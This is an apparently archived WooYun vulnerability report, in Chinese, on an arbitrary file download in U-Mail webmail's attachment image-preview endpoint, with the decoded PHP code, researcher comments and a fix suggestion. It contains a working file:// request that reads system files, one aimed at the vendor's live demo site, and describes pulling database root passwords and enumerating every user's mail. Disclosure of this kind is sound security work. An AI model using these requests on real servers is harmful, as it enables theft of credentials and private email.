{"id": 49029, "wybug_id": "wooyun-2014-085810", "wybug_title": "U-Mail最新版任意文件下载漏洞", "wybug_corp": "U-Mail邮件服务系统", "wybug_author": "香草", "wybug_date": "2014-12-04 13:06", "wybug_open_date": "2014-12-09 13:08", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄漏", "任意文件遍历下载"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t1970-01-01：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t1970-02-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t1970-03-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t1970-03-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-09：\t细节向公众公开  简要描述： 下载了最新版的umail，发现漏洞还不少，不过上wooyun一搜索，都是以前大牛提交过了，只好另找一个了。任意文件下载，泄露系统重要敏感信息，还可导致可下载任意用户的全部邮件。u-mail的使用量就不说了，可以参考：http://www.wooyun.org/bugs/wooyun-2010-061859 详细说明：  问题出现的位置是在图片预览的地方\nhttp://192.168.1.24/webmail/client/mail/index.php?module=operate&action=attach-img-preview&d_url=1.gif&type=application/octet-stream\n关键代码如下：\nif ( ACTION == \"attach-img-preview\" ){    $download_url = $_GET['d_url'];    $type = $_GET['type'];    $data = get_url_data( $download_url );    header( \"Content-type: \".$type );    header( \"Expires: 0\" );    header( \"Pragma: public\" );    echo $data;    exit( );}\nzend解密出来的代码，凑合着看吧继续跟进get_url_data,(admin/include/base_function.php)\nfunction get_url_data( $_obfuscate_Il8i, $_obfuscate_5E5Av0svlQ = 1 ){    $_obfuscate_u_c = curl_init( );    curl_setopt( $_obfuscate_u_c, CURLOPT_URL, $_obfuscate_Il8i );    curl_setopt( $_obfuscate_u_c, CURLOPT_SSL_VERIFYPEER, FALSE );    curl_setopt( $_obfuscate_u_c, CURLOPT_SSL_VERIFYHOST, FALSE );    curl_setopt( $_obfuscate_u_c, CURLOPT_RETURNTRANSFER, TRUE );    curl_setopt( $_obfuscate_u_c, CURLOPT_CONNECTTIMEOUT, $_obfuscate_5E5Av0svlQ );    $_obfuscate_6RYLWQ = curl_exec( $_obfuscate_u_c );    curl_close( $_obfuscate_u_c );    return $_obfuscate_6RYLWQ;}\nurl参数没有进行任何过滤，直接调用了c_url，因此我们可以访问如下url:\nhttp://192.168.1.24//webmail/client/mail/index.php?module=operate&action=attach-img-preview&d_url=file://C:\\windows\\win.ini&type=text/htm\n\n\nu-mail邮件系统在安装后会生成一些随机的密码作为数据库密码，已经新建两个系统用户，这些信息都存在umail下的readMe.txt,这个文件在web目录下是不能读取的\n\nmysql root密码，系统用户账号密码都尽收眼底,而且建议用户不要修改……\n\n更进一步我们可以做什么呢？下载任意用户的任意邮件。u-mail用户的邮件都会存在umail\\Users\\jc.com\\test目录下其中jc.com就是邮件服务器的域名，test是用户名，目录结构是：\n\n其中md50000000001.msg，md50000000002.msg就是用户的邮件，是按照数字递增的。因此我们可以很容易的写一个程序来遍历下载所有用户的所有邮件，邮件是eml格式的。\n\n   漏洞证明：  \nhttp://192.168.1.24//webmail/client/mail/index.php?module=operate&action=attach-img-preview&d_url=file://C:\\windows\\win.ini&type=text/htm\n\n\n给个官网测试链接（需要点击试用，登上一个普通账号）：\nhttp://mail.comingchina.com/webmail/client/mail/index.php?module=operate&action=attach-img-preview&d_url=file://C:\\\\windows\\win.ini&type=text/htm\n\n\nreadMe.txt\n\n   修复方案：  过滤d_url参数   版权声明：转载请注明来源 香草@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-09 13:08 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-04 13:18 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n   WooYun: U-Mail邮件系统任意文件下载漏洞  和这个一样不？    \n     2014-12-04 13:28 |    \t\t香草 \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:14        | javascript,xss,jsp、aspx)\t\t \n  @pandas 不是    \n     2014-12-04 13:48 |    \t\t香草 \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:14        | javascript,xss,jsp、aspx)\t\t \n  @疯狗 提交的时候没有选通用型漏洞(选错了)，是不是就没奖金啊    \n     2014-12-04 14:07 |    \t\txiaoL \t\t\t( 普通白帽子  |\t\t\t        Rank:361 漏洞数:67        | PKAV技术宅社区!Blog:http://www.xlixli....)\t\t \n  前排支持香草- -    \n     2014-12-09 13:54 |    \t\t香草 \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:14        | javascript,xss,jsp、aspx)\t\t \n  啊，忽略了，就怪我没选通用性软件吗 @疯狗    \n     2015-04-13 10:19 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  @疯狗 作者没钱呀 补上    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}